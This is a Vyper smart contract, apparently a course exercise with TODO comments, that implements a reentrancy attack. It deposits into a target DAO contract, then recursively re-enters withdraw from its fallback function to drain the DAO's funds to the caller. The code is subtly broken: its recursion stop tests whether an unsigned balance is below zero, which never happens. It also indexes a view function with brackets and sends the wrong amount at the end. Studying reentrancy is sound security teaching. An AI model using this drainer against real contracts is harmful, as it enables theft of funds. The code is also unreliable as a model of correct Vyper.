interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)
is_attack: public(bool)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    if(self.dao_address.balance < 0):
        self.is_attack = False
        return False
    #amountToWithdraw: uint256 = DAO(dao_address).userBalances[self.dao_address]
    DAO(self.dao_address).withdraw()

    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    deposit_amount: uint256 = msg.value    
 
    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
    
    # TODO: make the deposit into the DAO
    DAO(dao_address).deposit(value=deposit_amount)
    
    self.is_attack = True
    # TODO: Start the reentrance attack
    if(self.is_attack == True):
        #_attack = false
        DAO(dao_address).withdraw()

    # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
    send(msg.sender,DAO(dao_address).userBalances[msg.sender])
    
    pass

@external
@payable
def __default__():
    # This method gets invoked when Eth is sent to this contract's address (ie when Withdraw is called)
    
    # TODO: Add code here to complete the recursive call
    #amountToWithdraw: uint256 = DAO(dao_address).userBalances[msg.sender]
    #msg.sender.call.value(amountToWithdraw)("")
    #DAO.userBalances[msg.sender] = 0
    self._attack()
    pass
